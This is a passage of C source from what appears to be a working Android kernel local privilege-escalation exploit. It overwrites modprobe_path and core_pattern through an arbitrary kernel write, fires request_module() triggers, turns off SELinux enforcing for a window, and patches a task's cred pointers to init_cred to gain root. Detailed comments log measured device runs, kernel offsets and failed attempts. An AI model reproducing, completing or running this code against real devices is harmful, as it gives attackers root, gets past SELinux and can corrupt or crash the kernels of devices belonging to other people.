  /* Crash a dumpable process. The child is detached from our thread so the signal is never
   * delivered to us, and RLIMIT_CORE is what makes the kernel route it to do_coredump(). */
  pid_t child = fork();
  if (child == 0) {
    struct rlimit rl;
    rl.rlim_cur = RLIM_INFINITY;
    rl.rlim_max = RLIM_INFINITY;
    if (setrlimit(RLIMIT_CORE, &rl) != 0) {
      _exit(3);
    }
    /* Make sure we are dumpable: a process that changed credentials is not, but we have not. */
    if (prctl(PR_SET_DUMPABLE, 1, 0, 0, 0) != 0) {
      _exit(4);
    }
    usleep(200000);
    raise(SIGSEGV);
    _exit(5);
  }
  rmg_diag("ROOT cp trigger child=%d raised SIGSEGV\n", (int)child);

  /* The coredump helper is spawned by a kworker, so allow a generous window. */
  int wait_ms = root_mp_env_seconds("ROOT_CPIPE_WAIT_SEC", 25) * 1000;
  int got = 0;
  for (int waited = 0; waited < wait_ms; waited += 250) {
    if (access(marker, F_OK) == 0) {
      got = 1;
      break;
    }
    usleep(250000);
  }
  rmg_diag("ROOT cp marker %s after %dms\n", got ? "APPEARED" : "NEVER APPEARED", wait_ms);
  if (!got) {
    rmg_diag("ROOT cp FAILED (no marker); core_pattern left planted, reboot to clear\n");
    return 0;
  }
  /* Read the ids the helper actually ran with. This is the actual claim under test. */
  char ids[256];
  memset(ids, 0, sizeof(ids));
  int ifd = open("/data/local/tmp/.cp_ran.ids", O_RDONLY | O_CLOEXEC);
  if (ifd >= 0) {
    ssize_t gotn = read(ifd, ids, sizeof(ids) - 1);
    close(ifd);
    if (gotn > 0) {
      rmg_diag("ROOT cp helper ids=[%.*s]\n", (int)gotn, ids);
    }
  }
  rmg_diag("ROOT cp SUCCEEDED stage - root helper reached via core_pattern\n");
  return 1;
}

static int root_mp_drop_script(void) {
  const char *helper = getenv("CVE43499_ROOT_HELPER");
  if (!helper || helper[0] != '/') {
    helper = ROOT_UMH_PATH;
  }
  char script[512];
  int n = snprintf(script, sizeof(script),
                   "#!/system/bin/sh\n"
                   "echo start > " ROOT_MP_MARKER "\n"
                   "chmod 0666 " ROOT_MP_MARKER "\n"
                   "%s --umh %u &\n",
                   helper, (unsigned)getuid());
  if (n <= 0 || n >= (int)sizeof(script)) {
    rmg_diag("ROOT mp script build failed n=%d\n", n);
    return 0;
  }
  int sfd = open(ROOT_MP_SCRIPT, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
  if (sfd < 0) {
    rmg_diag("ROOT mp script open errno=%d\n", errno);
    return 0;
  }
  ssize_t wrote = write(sfd, script, (size_t)n);
  if (fchmod(sfd, 0755) != 0) {
    rmg_diag("ROOT mp script fchmod errno=%d\n", errno);
  }
  close(sfd);
  rmg_diag("ROOT mp script written bytes=%zd helper=%s clientuid=%u\n", wrote,
           helper, (unsigned)getuid());
  return wrote == (ssize_t)n;
}

/* request_module() battery. These are plain unprivileged syscalls that make the
 * kernel exec modprobe_path. The kernel waits for it (UMH_WAIT_PROC), and
 * --umh ends in daemon_main(), so this MUST run in a detached child or the
 * calling thread would block forever. AF_ALG with an unknown algorithm is the
 * classic crypto-%s request; the inet protocol numbers hit net-pf-%d-proto-%d.
 *
 * Coverage is deliberately broad. The write only buys a root shell if SOME
 * request_module() actually fires before the restore, and which of these paths
 * is built-in versus loadable differs per firmware - one run measured the AF_ALG
 * bind alone while the inet attempts returned without a module. Every family
 * that has no handler produces net-pf-%d, every mount with an unknown type
 * produces fs-%s, and every unknown inet protocol produces
 * net-pf-%d-proto-%d; they cost nothing but wall time inside the detached child.
 * The families listed are the ones commonly shipped as loadable modules on this
 * platform (bluetooth/nfc/tipc/can/vsock/kcm/smc/xdp/qrtr/rds/llc/phonet/ieee802154/caif/x25). */
static void root_mp_fire_triggers(void) {
  struct {
    uint16_t family;
    uint8_t type[14];
    uint32_t feat;
    uint32_t mask;
    uint8_t name[64];
  } alg;
  memset(&alg, 0, sizeof(alg));
  alg.family = 38; /* AF_ALG */

  /* AF_ALG with an UNREGISTERED salg_type. This is the only AF_ALG path that
   * calls request_module() unconditionally (crypto/af_alg.c af_alg_bind):
   *
   *     type = alg_get_type(sa->salg_type);
   *     if (PTR_ERR(type) == -ENOENT) {
   *             request_module("algif-%s", sa->salg_type);
   *             type = alg_get_type(sa->salg_type);
   *     }
   *
   * The previous trigger used salg_type = "hash", which IS in alg_types[], so
   * alg_get_type() succeeded and bind() went straight into hash_bind() - past
   * the request_module() entirely. Nothing in the old trigger set could be
   * assumed to reach call_modprobe(); this one is verified against the source.
   * Every registered type is still tried too, in case the module names behind
   * them auto-load something, and each attempt is logged with its errno so a
   * failure here is diagnosable from rmg-diag.log alone. */
  static const char *const alg_types[] = {"mpmiss", "hash", "cipher", "skcipher",
                                          "rng",   "blkcipher"};
  for (size_t i = 0; i < sizeof(alg_types) / sizeof(alg_types[0]); i++) {
    memset(&alg, 0, sizeof(alg));
    alg.family = 38;
    size_t tl = strlen(alg_types[i]);
    memcpy(alg.type, alg_types[i], tl);
    memcpy(alg.name, "mpmiss", 7);
    int s = socket(38, SOCK_SEQPACKET, 0);
    if (s >= 0) {
      int brc = bind(s, (struct sockaddr *)&alg, (socklen_t)sizeof(alg));
      rmg_diag("ROOT mp trigger AF_ALG type=%s bind_ret=%d errno=%d\n",
               alg_types[i], brc, errno);
      close(s);
    } else {
      rmg_diag("ROOT mp trigger AF_ALG type=%s socket failed errno=%d\n",
               alg_types[i], errno);
    }
  }

  /* fs/exec.c:search_binary_handler() - after every registered binary format has
   * declined a file, a file whose first four bytes are NOT all printable makes
   * the kernel ask for a "binfmt-%04x" module built from bytes 2 and 3. A 4-byte
   * 0xff prefix matches no format, so this reaches request_module() with nothing
   * else required: no device, no capability, no mount. */
  int bfd = open(ROOT_MP_BINFMT, O_WRONLY | O_CREAT | O_TRUNC, 0755);
  if (bfd >= 0) {
    static const unsigned char magic[8] = {0xff, 0xff, 0x6d, 0x70,
                                           0x00, 0x00, 0x00, 0x00};
    ssize_t w = write(bfd, magic, sizeof(magic));
    (void)w;
    close(bfd);
    chmod(ROOT_MP_BINFMT, 0755);
    char *const av[] = {(char *)ROOT_MP_BINFMT, NULL};
    char *const ev[] = {(char *)"PATH=/system/bin", NULL};
    int erc = execve(ROOT_MP_BINFMT, av, ev);
    rmg_diag("ROOT mp trigger binfmt execve ret=%d errno=%d (ENOEXEC=%d)\n", erc,
             errno, ENOEXEC);
  } else {
    rmg_diag("ROOT mp trigger binfmt open failed errno=%d\n", errno);
  }

  static const int protos[] = {132, 136, 33, 108, 46};
  for (size_t i = 0; i < sizeof(protos) / sizeof(protos[0]); i++) {
    int s = socket(AF_INET, SOCK_STREAM, protos[i]);
    if (s >= 0) {
      close(s);
    }
    s = socket(AF_INET, SOCK_DGRAM, protos[i]);
    if (s >= 0) {
      close(s);
    }
  }

  /* net-pf-%d for every unassigned protocol family. Unhandled families are
   * exactly the ones that ask the kernel to load a module first. */
  static const int families[] = {9,  15, 20, 21, 22, 24, 25, 26, 27, 29,
                                 30, 31, 34, 35, 36, 37, 39, 40, 41, 42,
                                 43, 44};
  for (size_t i = 0; i < sizeof(families) / sizeof(families[0]); i++) {
    int s = socket(families[i], SOCK_SEQPACKET, 0);
    if (s >= 0) {
      close(s);
    }
    s = socket(families[i], SOCK_DGRAM, 0);
    if (s >= 0) {
      close(s);
    }
    s = socket(families[i], SOCK_STREAM, 0);
    if (s >= 0) {
      close(s);
    }
  }

  /* fs-%s via an unknown filesystem type. Returns EPERM for an unprivileged
   * caller (no CAP_SYS_ADMIN), so this is logged rather than assumed - it is
   * only a valid trigger for a caller that already has that capability. */
  mkdir("/data/local/tmp/mpmnt", 0755);
  int mrc = mount("none", "/data/local/tmp/mpmnt", "rmgnomodfs", 0, NULL);
  rmg_diag("ROOT mp trigger fs-%s mount_ret=%d errno=%d\n", "rmgnomodfs", mrc,
           errno);
  umount("/data/local/tmp/mpmnt");
}

static void root_mp_report_files(const char *when) {
  struct stat st;
  memset(&st, 0, sizeof(st));
  if (stat(ROOT_CREDS_SENTINEL, &st) == 0) {
    rmg_diag("ROOT mp %s creds mode=%o uid=%u gid=%u size=%lld\n", when,
             (unsigned)(st.st_mode & 07777), (unsigned)st.st_uid,
             (unsigned)st.st_gid, (long long)st.st_size);
    char body[160];
    memset(body, 0, sizeof(body));
    int cfd = open(ROOT_CREDS_SENTINEL, O_RDONLY | O_CLOEXEC);
    if (cfd >= 0) {
      ssize_t got = read(cfd, body, sizeof(body) - 1);
      close(cfd);
      rmg_diag("ROOT mp %s creds body ret=%zd [%s]\n", when, got, body);
    }
  } else {
    rmg_diag("ROOT mp %s creds ABSENT errno=%d\n", when, errno);
  }
  if (stat(ROOT_MP_MARKER, &st) == 0) {
    rmg_diag("ROOT mp %s marker uid=%u mode=%o\n", when, (unsigned)st.st_uid,
             (unsigned)(st.st_mode & 07777));
  } else {
    rmg_diag("ROOT mp %s marker ABSENT errno=%d\n", when, errno);
  }
}

/* 1 when the creds file exists and reports a real root process, 0 otherwise. The
 * file is unlinked before the attempt, so this can only be true for a write that
 * happened during THIS run.
 *
 * Parsed rather than substring-matched. A plain strstr(body, "uid=0") is satisfied
 * by "euid=0" too, so a banner of `uid=1000 euid=0` would have been logged as
 * "creds VERIFIED uid=0" - the diagnostic would assert root where there is none.
 * read_root_creds_uid() already implements the strict rule (uid==euid and uid==0)
 * and the publication step re-checks it, so this is about the AFTER-HIT/AFTER-MISS
 * line telling the truth rather than about safety. */
static int root_mp_creds_root(void) {
  uint32_t measured = 0xffffffff;
  return read_root_creds_uid(&measured) && measured == 0;
}

/* Milliseconds since boot. Only used to report how long the two wait windows
 * actually took, so a plain CLOCK_MONOTONIC read is enough - the value never
 * leaves this file. */
static unsigned long root_mp_now_ms(void) {
  struct timespec ts;
  if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
    return 0;
  }
  return (unsigned long)ts.tv_sec * 1000ul + (unsigned long)(ts.tv_nsec / 1000000);
}

/* Seconds from the environment, with a fallback and a sanity range. An invalid
 * value falls back rather than failing, because a typo in a wait window must not
 * be able to turn the wait off. */
static int root_mp_env_seconds(const char *name, int fallback) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return fallback;
  }
  char *end = NULL;
  errno = 0;
  long parsed = strtol(value, &end, 10);
  if (errno || end == value || *end || parsed < 0 || parsed > 3600) {
    rmg_diag("ROOT mp ignoring invalid %s=%s\n", name, value);
    return fallback;
  }
  return (int)parsed;
}

/* Prove the physical alias with pure userspace I/O before any store.
 *
 * data_direct_addr() computes PAGE_OFFSET + (P0_KERNEL_PHYS_LOAD +
 * slide_p0_offset + off) - P0_PHYS_OFFSET. /proc/iomem's "Kernel code" line is
 * __pa(_text), i.e. P0_KERNEL_PHYS_LOAD + slide_p0_offset. Equal means the
 * alias arithmetic is right for THIS boot; unequal means a write through it
 * would land 24 bytes on an unrelated RAM page.
 *
 * Returns 1 proven, 0 disproven, -1 inconclusive (iomem unreadable or missing
 * the Kernel code line). */
static int root_mp_validate_phys(void) {
  uintptr_t expected =
      (uintptr_t)P0_KERNEL_PHYS_LOAD + (uintptr_t)slide_p0_offset;
  FILE *f = fopen("/proc/iomem", "r");
  if (!f) {
    rmg_diag("ROOT mp iomem open errno=%d\n", errno);
    return -1;
  }
  char line[256];
  int verdict = -1;
  int seen = 0;
  while (fgets(line, sizeof(line), f)) {
    if (!strstr(line, "Kernel")) {
      continue;
    }
    unsigned long long start = 0;
    unsigned long long end = 0;
    if (sscanf(line, " %llx-%llx", &start, &end) != 2) {
      continue;
    }
    rmg_diag("ROOT mp iomem %s", line);
    if (strstr(line, "Kernel code")) {
      if (start == 0 && end == 0) {
        /* kernel/resource.c r_show() gates the real range behind
         * file_ns_capable(m->file, &init_user_ns, CAP_SYS_ADMIN) and prints
         * zeros for everyone else. This payload runs as uid 2000, so on a real
         * device this line reads "00000000-00000000 : Kernel code". That is
         * "not disclosed", NOT "the alias is wrong" - treating it as disproven
         * would silently block this stage on every unprivileged run. Fall
         * through to the direct-read proof instead. */
        rmg_diag("ROOT mp iomem Kernel code undisclosed to uid=%u; "
                 "inconclusive (not a disproof)\n",
                 (unsigned)getuid());
        verdict = -1;
      } else {
        verdict = ((uintptr_t)start == expected);
        rmg_diag("ROOT mp phys expected_text=%016zx iomem_text=%016llx "
                 "expected_mp_phys=%016zx match=%d\n",
                 expected, start,
                 (uintptr_t)start + (uintptr_t)MODPROBE_PATH_OFF, verdict);
      }
    }
    if (++seen >= 8) {
      break;
    }
  }
  fclose(f);
  if (verdict < 0) {
    rmg_diag("ROOT mp iomem had no usable Kernel code line\n");
  }
  return verdict;
}

/* SELinux is only flipped for the short window between the modprobe_path write
 * and its restore. If the process dies inside that window the state is still
 * only boot-scoped, but leaving enforcing off for the rest of the boot is
 * avoidable damage, so register a normal-exit rollback as well. Signal/crash
 * paths cannot be caught here by design (the fd and address are not
 * async-signal-safe to touch mid-fault); reboot clears those. */
static int g_se_restore_fd = -1;
static uintptr_t g_se_restore_addr = 0;
static char g_se_restore_value = 0;

static void root_mp_selinux_atexit(void) {
  if (g_se_restore_fd < 0) {
    return;
  }
  root_mp_write(g_se_restore_fd, g_se_restore_addr, &g_se_restore_value, 1,
                "selinux-atexit");
  g_se_restore_fd = -1;
}

/* Find a linear alias that really addresses modprobe_path, by BRUTE PROBE.
   *
   * The first version of this probed with an IDEMPOTENT write - it wrote `original`,
   * the bytes already there, and treated "image unchanged" as confirmation. That is
   * wrong, and the device said so:
   *     ROOT mp alias CONFIRMED at ffffff8002b32bf8 (image unchanged by an idempotent write)
   *     ROOT mp alias MISMATCH - linear write did not reach the image
   * "Image unchanged" is equally true when the write landed correctly AND when it
   * went nowhere, so the probe rubber-stamped an address already measured to be
   * wrong. An idempotent probe has no information content.
   *
   * This version writes the REPLACEMENT and lets the image say which of three things
   * happened - that is the only way to tell "correct", "absorbed" and "some other
   * page" apart:
   *     image == replacement  -> this candidate IS modprobe_path (and it is now
   *                              planted, which is the outcome we wanted);
   *     image == original     -> the write did not land here at all;
   *     image == anything else-> this candidate is a different page and we have
   *                              just overwritten 24 bytes of it.
* ROOT_MP_ALIAS_HEX=<hex> restricts the list to exactly that one candidate, which is
 * what a targeted test needs: a wrong candidate is no longer merely absorbed, it
 * can fault the kernel outright (see the ordering note below), so a run must be
 * able to try ONE address. A wrong candidate costs 24 bytes of the replacement
 * landing on an unrelated page; that is accepted because the alternative is not
 * progressing, and candidates are ordered so the most likely one is tried first. */
static int root_mp_write_via_alias(int fd, uintptr_t image_addr,
                                    const char *replacement,
                                    const char *original,
                                    uintptr_t *out_alias) {
  uintptr_t off = (uintptr_t)MODPROBE_PATH_OFF;
  uintptr_t slide = slide_p0_offset;
  uintptr_t candidates[5];
  size_t n = 0;
  const char *override_hex = getenv("ROOT_MP_ALIAS_HEX");
  if (override_hex && override_hex[0] == '0' &&
      (override_hex[1] == 'x' || override_hex[1] == 'X')) {
    candidates[n++] = (uintptr_t)strtoull(override_hex + 2, NULL, 16);
  } else {
    /* ROOT_MP_PROBE_IMAGE=0 skips the SLID KERNEL-IMAGE address of modprobe_path,
     * which is otherwise tried first.
     *
     * MEASURED 2026-10-02: writing through it works. Run 14 planted the path and
     * read it back through the image:
     *     ROOT mp alias probe 1/5 cand=ffffffc00ac02bf8
     *     ROOT mp aliasprobe write addr=ffffffc00ac02bf8 ret=24 errno=0 ok=1
     *     ROOT mp alias probe 1 image now
     *       hex=2f646174612f6c6f63616c2f746d702f6d70000000000000
     *     ROOT mp alias CONFIRMED at ffffffc00ac02bf8 - the image carries our path
     *     ROOT mp verify=[/data/local/tmp/mp]
     *     ROOT mp alias VERIFIED (linear write observed through the image)
     * and the device stayed up through the rest of the stage, so the release-time
     * vfree() concern below did not materialise either.
     *
     * It is first because every linear candidate is MEASURED to kill the kernel.
     * Runs 12 and 13 each stopped at
     *     WR target=ffffff8002ab2bf8 base=ffffff8002000000 pos=0xab2bf8 len=24
     *     WR target=ffffff8002b32bf8 base=ffffff8002000000 pos=0xb32bf8 len=24
     * with no "WR pwrite ret=" after either. Both share base=0xffffff8002000000 and
     * both differ from the one base that works (0xffffff89f2000000), which pins the
     * fault to that 32 MB window rather than to the offset arithmetic. Ordering a
     * route that reboots the phone ahead of one that works is not a defensible
     * default, so the linear forms are now only reached if this is turned off.
     *
     * Residual risk if a future kernel really is a configfs bin file: close() runs
     * configfs_release_bin_file(), which vfree()s bin_buffer, and the kernel image
     * IS registered as a vm_struct (map_kernel_segment() -> vm_area_add_early() for
     * vmlinux_text / vmlinux_data, arch/arm64/mm/mmu.c). That is why the plant, the
     * request_module() triggers and the helper all happen before the close. */
    const char *skip_image = getenv("ROOT_MP_PROBE_IMAGE");
    if (!(skip_image && skip_image[0] == '0' && skip_image[1] == '\0')) {
      candidates[n++] = image_addr;
    }
    /* Candidate order, and why it is this order.
     *
     * MEASURED 2026-10-02 (run 12, p0off=0x100000): probing
     *     PAGE_OFFSET + off            = 0xffffff8002ab2bf8
     * KILLED THE KERNEL - "WR target=... pos=0xab2bf8 len=24" is the last line
     * rmg-diag.log records, so the pwrite never returned. That address is
     * PAGE_OFFSET short by exactly TEXT_OFFSET (0x80000): the derivation in
     * kimg_linear_alias() assumes phys(_text) == PHYS_OFFSET, i.e. that the Image
     * is loaded at memstart_addr with zero offset. It is not - the arm64 boot
     * protocol (Documentation/arm64/booting.rst) places the Image at
     * memstart_addr + text_offset, and this tree's text_offset is 0x80000, which
     * is the P0_KERNEL_PHYS_LOAD - PHYS_OFFSET term that candidate 1 was missing.
     *
     * The fall-through that killed it is also explained rather than merely observed:
     * mark_linear_text_alias_ro() (arch/arm64/mm/mmu.c) makes the LINEAR alias of
     * [_stext, __init_begin) read-only, so a store into the .text/.rodata 512 KB
     * below modprobe_path faults on the linear mapping. Writing to the linear alias
     * is only safe while the target really is in .data.
     *
     * 1. no slide, physical load from the boot image header (P0_KERNEL_PHYS_LOAD).
     *    KASLR moves the VIRTUAL mapping only; the Image's physical pages are
     *    where the bootloader put them, so the physical-load term is correct and
     *    the slide must NOT appear.
     * 2. the same plus the slide, so a refutation is self-diagnosing.
     * 3/4. the two TEXT_OFFSET-less forms, kept only as a last resort: candidate 3
     *    is measured to fault and candidate 4 is its slide-shifted twin. */
    candidates[n++] =
        (uintptr_t)(P0_PAGE_OFFSET + P0_KERNEL_PHYS_LOAD + off - P0_PHYS_OFFSET);
    candidates[n++] = (uintptr_t)(P0_PAGE_OFFSET + P0_KERNEL_PHYS_LOAD + off -
                                  P0_PHYS_OFFSET + slide);
    candidates[n++] = kimg_linear_alias(MODPROBE_PATH);
    candidates[n++] = (uintptr_t)(P0_PAGE_OFFSET + off + slide);
  }

  char readback[ROOT_MP_LEN];
  for (size_t i = 0; i < n; i++) {
    rmg_diag("ROOT mp alias probe %zu/%zu cand=%016zx\n", i + 1, n, candidates[i]);
    if (!root_mp_write(fd, candidates[i], replacement, ROOT_MP_LEN, "aliasprobe")) {
      rmg_diag("ROOT mp alias probe %zu write did not report success\n", i + 1);
      continue;
    }
    memset(readback, 0, sizeof(readback));
    if (!root_mp_read24(fd, image_addr, readback, "aliasprobe-read")) {
      rmg_diag("ROOT mp alias probe %zu readback could not be cross-validated\n",
               i + 1);
      continue;
    }
    rmg_diag("ROOT mp alias probe %zu image now hex=%s\n", i + 1,
             root_mp_hex(readback, ROOT_MP_LEN));
    if (memcmp(readback + 1, replacement + 1, ROOT_MP_LEN - 1) == 0) {
      rmg_diag("ROOT mp alias CONFIRMED at %016zx - the image carries our path\n",
               candidates[i]);
      *out_alias = candidates[i];
      return 1;
    }
    if (memcmp(readback + 1, original + 1, ROOT_MP_LEN - 1) == 0) {
      rmg_diag("ROOT mp alias %016zx: write ABSORBED (image still original)\n",
               candidates[i]);
    } else {
      rmg_diag("ROOT mp alias %016zx: write landed on a DIFFERENT page (image "
               "reads hex=%s) - 24 bytes of replacement were written to unrelated "
               "memory\n",
               candidates[i], root_mp_hex(readback, ROOT_MP_LEN));
    }
    /* Locate the write instead of only judging it. A write that is not absorbed
     * but is not at modprobe_path has gone SOMEWHERE in kernel memory; if that
     * somewhere is another .data location, it is inside the image and a short
     * scan around the target will find it, which yields the image-offset delta
     * directly and turns a guess into a measurement. Only run when the image is
     * intact, since a corrupted image would make the scan meaningless. */
    if (memcmp(readback + 1, original + 1, ROOT_MP_LEN - 1) == 0) {
      char window[ROOT_MP_SCAN_LEN];
      size_t step = 24;
      for (size_t off = 0; off + ROOT_MP_LEN <= ROOT_MP_SCAN_LEN; off += step) {
        char probe[ROOT_MP_LEN];
        if (!root_mp_read(fd, image_addr + off, probe, sizeof(probe), "scan")) {
          break;
        }
        memcpy(window + off, probe, ROOT_MP_LEN);
      }
      for (size_t off = 0; off + ROOT_MP_LEN <= ROOT_MP_SCAN_LEN; off += step) {
        if (memcmp(window + off + 1, replacement + 1, ROOT_MP_LEN - 1) == 0) {
          rmg_diag("ROOT mp alias %016zx: FOUND our path at image+%zx - the "
                   "linear alias is off by %+d bytes\n",
                   candidates[i], off, (int)((intptr_t)off -
                                             (intptr_t)MODPROBE_PATH_OFF));
          break;
        }
      }
      rmg_diag("ROOT mp alias %016zx: path not found within %u bytes above "
               "modprobe_path\n",
               candidates[i], (unsigned)ROOT_MP_SCAN_LEN);
    }
  }
  rmg_diag("ROOT mp no candidate alias produced the path in the image\n");
  return 0;
}

/* ---------------------------------------------------------------------------
 * Credential patch route - the shortest path to root once the arbitrary kernel
 * WRITE is real.
 *
 * WHY THIS REPLACES request_module(). The modprobe_path plant works and is
 * verified (ROOT mp alias VERIFIED ... observe the path in the image), but the
 * helper never runs. Measured reason, run 15:
 *     ROOT mp trigger AF_ALG type=mpmiss socket failed errno=13     <- EACCES
 *     ROOT mp trigger binfmt execve ret=-1 errno=8 (ENOEXEC=8)      <- ENOEXEC
 *     ROOT mp trigger fs-rmgnomodfs mount_ret=-1 errno=13           <- EACCES
 * ENOEXEC from execve is what fs/exec.c:search_binary_handler() produces on the
 * branch `if (request_module("binfmt-%04x", ...) < 0) return retval;` - so
 * request_module() WAS reached and returned an error. call_modprobe() runs
 * security_kernel_module_request() first (kernel/kmod.c:93 region), which lands on
 * the AVC, and u:r:shell:s0 is denied module/module_request while the policy is
 * enforcing. The same AVC is what refused AF_ALG and mount outright.
 *
 * There is no way around that with modprobe_path: selinux_state.enforcing only
 * exists when CONFIG_SECURITY_SELINUX_DEVELOP is set - enforcing_enabled() in
 * security/selinux/include/security.h is `return true` in the #else branch - and
 * modprobe_path is used by exactly one caller in the whole tree (kernel/kmod.c), so
 * there is no second usermodehelper entry point.
 *
 * BUT the write primitive is not limited to modprobe_path. task_struct is reachable
 * from init_task, whose image offset is known, and every field offset it needs is
 * DERIVED from measured kernel memory rather than assumed from a source layout:
 *
 *   offsetof(task_struct, tasks)  found from the doubly-linked list invariant:
 *                                 the qword at init_task+T is init_task.tasks.next
 *                                 = &next->tasks, and &next->tasks->prev is
 *                                 &init_task->tasks = init_task+T, so
 *                                 read64(init_task[T]) == init_task+T pins T.
 *   offsetof(task_struct, comm)   init_task.comm is the compile-time constant
 *                                 "swapper/0" (INIT_TASK_COMM), so the byte pattern
 *                                 pins the offset without guessing.
 *   offsetof(task_struct, cred)   init_task.cred points at init_cred, whose first
 *                                 40 bytes are a small refcount followed by 32 zero
 *                                 bytes (uid/gid/suid/sgid/euid/egid/fsuid/fsgid) and
 *                                 a zero securebits. Any qword in init_task that
 *                                 points into the kernel address space is read and
 *                                 matched against that signature.
 *
 * With all three offsets known the list is walked with single-qword reads (the old
 * walk failed on ONE 784-byte read of a hardened task_struct, so nothing here reads
 * a whole task_struct), the thread whose comm is the name set just above is found,
 * and its `cred` and `real_cred` (cred - 8, they are adjacent members) are set to
 * init_cred's own address. init_cred is uid/gid 0 with full capabilities, so the
 * patched thread IS root - it does not borrow another process's identity - and
 * nothing unprivileged holds a pointer to it, so this cannot be reached except
 * through this route.
 * ------------------------------------------------------------------------- */
/* Struct task_struct field offsets come from the raw BTF blob embedded in THIS
 * firmware's Image (kernel offset 0x21ef2ac, v1), recorded in target.h:
 *
 *     struct task_struct  size 0x1200  tasks 0x4d0  pid 0x5d8
 *                                     real_cred 0x790  cred 0x798  usage 0x38
 *
 * An earlier version derived `tasks` at runtime by dereferencing every kernel-looking
 * qword in init_task and keeping the one whose target read back as init_task+T. That
 * killed the kernel on the first run (run 17): most qwords in init_task are not
 * pointers at all, and reading eight bytes at a value like 0xffffffff... - or across
 * the end of a mapping - faults. Deriving an offset must never require dereferencing a
 * value that has not been proved to be a pointer, so that loop is gone.
 *
 * What IS verified at runtime, using only reads of addresses this code computed
 * itself as init_task + a compile-time constant:
 *   init_task + 0x38 == 2 and + 0x7c == 120 - the usage/prio signature target.h
 *     documents for init_task;
 *   init_task.comm == "swapper/0" (INIT_TASK_COMM);
 *   init_cred's first 40 bytes are a small refcount followed by the zero uid/gid block;
 *   the list head at init_task + 0x4d0 links back into the kernel address space. */
#define ROOT_CP_INIT_SCAN 8192
#define ROOT_CP_CHUNK 256
#define ROOT_CP_WALK_MAX 1024
#define ROOT_CP_COMM_OFF 0x7a8ULL
#define ROOT_CP_TASKS_OFF PIPE_WALK_TASK_TASKS_OFF
#define ROOT_CP_PID_OFF PIPE_WALK_TASK_PID_OFF
#define ROOT_CP_CRED_OFF TASK_STRUCT_CRED_OFF
#define ROOT_CP_REAL_CRED_OFF TASK_STRUCT_REAL_CRED_OFF
/* Two different guards, because two different kinds of pointer are followed.
 * ROOT_CP_SLAB_* bounds what may appear on the task list: task_structs are kmalloc
 * objects, i.e. in the linear map, and a walk that leaves that range has lost the
 * list. ROOT_CP_KERN_* is the much weaker "this is a kernel pointer at all" test,
 * which is the only thing init_cred needs - it lives in the kernel image's .data at
 * 0xffffffc00a...-ish, which is ABOVE the slab range, so reusing the slab bound for
 * it rejected a perfectly good pointer (run 20: cred == real_cred ==
 * ffffffc00a2abea0 and the stage still bailed out). */
#define ROOT_CP_SLAB_LO 0xffffff8000000000ULL
#define ROOT_CP_SLAB_HI 0xffffffb000000000ULL
#define ROOT_CP_KERN_LO 0xffffff8000000000ULL
#define ROOT_CP_KERN_HI 0xfffffffffffff000ULL

static unsigned char root_cp_img[ROOT_CP_INIT_SCAN];

static int root_cp_read(int fd, uintptr_t a, void *buf, size_t len) {
  memset(buf, 0, len);
  ssize_t got = configfs_read_once(fd, a, buf, len);
  return got == (ssize_t)len;
}

static int root_cp_read64(int fd, uintptr_t a, uint64_t *out) {
  return root_cp_read(fd, a, out, sizeof(*out));
}

static int root_cp_addr_ok(uint64_t v) {
  return v >= ROOT_CP_SLAB_LO && v <= ROOT_CP_SLAB_HI;
}

static int root_cp_kern_ok(uint64_t v) {
  return v >= ROOT_CP_KERN_LO && v <= ROOT_CP_KERN_HI && (v & 7) == 0;
}

static uint64_t root_cp_le(const unsigned char *p, size_t off) {
  uint64_t v = 0;
  memcpy(&v, p + off, sizeof(v));
  return v;
}

/* What is this fd, really? Log it before trusting it.
   *
   * open_ashmem_device() opens ashmem_path, which init_ashmem_path() sets to
   /dev/ashmem<boot_id>, and that node exists (crw-rw-rw- 10, 125). But ashmem_fops in
   * this tree has NO write path at all - only .read_iter - and ashmem_read_iter() bails
   * with `if (pos < 0 || pos >= ashmem->size) goto out;`, i.e. it returns 0. That is
   * EXACTLY what run 24 got:
   *     RD target=ffffffc00ada5080 page=92978c5edb63ec1c pos=0x6d6873612f766464 len=256
   *     RD pread ret=0 errno=0 ...
   *     ROOT cp init_task read failed at +0 errno=0
   * while runs 22/23 read the same offsets fine at a different address. A primitive whose
   * behaviour depends on the target address is not obviously ashmem, and /proc/self/fd
   * names the file in one line, so it is asked rather than inferred. */
static void root_cp_log_fd(int fd) {
  char link[64] = {0}, target[256] = {0};
  snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
  ssize_t n = readlink(link, target, sizeof(target) - 1);
  if (n > 0) {
    target[n] = '\0';
  } else {
    snprintf(target, sizeof(target), "<readlink failed errno=%d>", errno);
  }
  struct stat st;
  memset(&st, 0, sizeof(st));
  int have = (fstat(fd, &st) == 0);
  rmg_diag("ROOT cp fd=%d target=[%s] fstat=%d mode=%o rdev=%llu:%llu\n", fd, target,
           have, have ? (unsigned)(st.st_mode & 07777) : 0u,
           (unsigned long long)(have ? st.st_rdev : 0),
           (unsigned long long)(have ? st.st_rdev >> 24 : 0));
}


/* DECISIVE: is the task slab actually unwritable, or did the earlier scan merely die later?
   The "slab writes fault" conclusion rests on one log that stopped at
   "WR target=ffffff8837b6a798" with no "WR pwrite ret=" after it. That is suggestive, not
   proof: configfs_write_once() would also stop logging there if the process were killed for
   an unrelated reason afterwards - and in this very run we were writing init_cred into
   candidate task_structs, so a corrupted scheduler-visible task could panic the kernel with
   no fault logged in the write path at all. If slab writes DO land, the cred patch is
   perfectly viable and the whole route is alive.

   So: write a harmless, self-describing 8-byte pattern to first_task + usage (0x38, a
   refcount_t that nothing dereferences on our behalf), read it back, and then RESTORE the
   original value. No cred pointer is touched, so even if the write lands there is nothing
   for the kernel to trip over. A readback equal to the pattern proves slab writes work;
   a fault proves they do not. Either answer is decisive and neither can be misread. */
static void root_cp_probe_slab_write(int fd, uint64_t first_task) {
  uintptr_t addr = (uintptr_t)first_task + 0x38;
  uint64_t orig = 0, back = 0;
  if (!root_cp_read64(fd, addr, &orig)) {
    rmg_diag("ROOT cp slab probe: cannot read original usage, aborting\n");
    return;
  }
  uint64_t pat = 0x1122334455667788ULL;
  rmg_diag("ROOT cp slab probe addr=%016llx orig=%016llx\n",
           (unsigned long long)addr, (unsigned long long)orig);
  ssize_t w = configfs_write_once(fd, addr, &pat, sizeof(pat));
  rmg_diag("ROOT cp slab probe write ret=%zd errno=%d\n", w, errno);
